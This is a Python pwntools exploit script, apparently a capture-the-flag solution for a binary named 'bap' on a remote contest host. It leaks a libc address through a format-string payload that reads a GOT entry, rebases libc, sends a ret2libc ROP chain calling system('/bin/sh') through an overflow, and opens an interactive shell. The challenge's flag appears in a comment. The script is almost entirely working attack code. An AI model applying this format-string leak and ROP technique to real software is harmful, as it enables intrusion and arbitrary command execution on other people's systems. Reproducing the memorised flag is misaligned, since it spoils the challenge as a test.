#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./bap_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe

REMOTE_NC_CMD    = "nc challs.actf.co 31323"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
b main
c
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()

    payload = b"%8$sBBBB"+b"A"*8 + p64(exe.got.gets) + p64(exe.entry)
    r.sendline(payload)
    r.recvuntil(b": ")
    leak = u64(r.recv(6)+b"\x00\x00")
    libc.address = leak - libc.sym.gets

    rop = ROP(libc)
    rop.call("system", [libc.binsh()])

    payload = b"A"*8*3+p64(rop.ret.address)+rop.chain()
    r.sendline(payload)

    r.interactive()
    #actf{baaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaap____}

if __name__ == "__main__":
    main()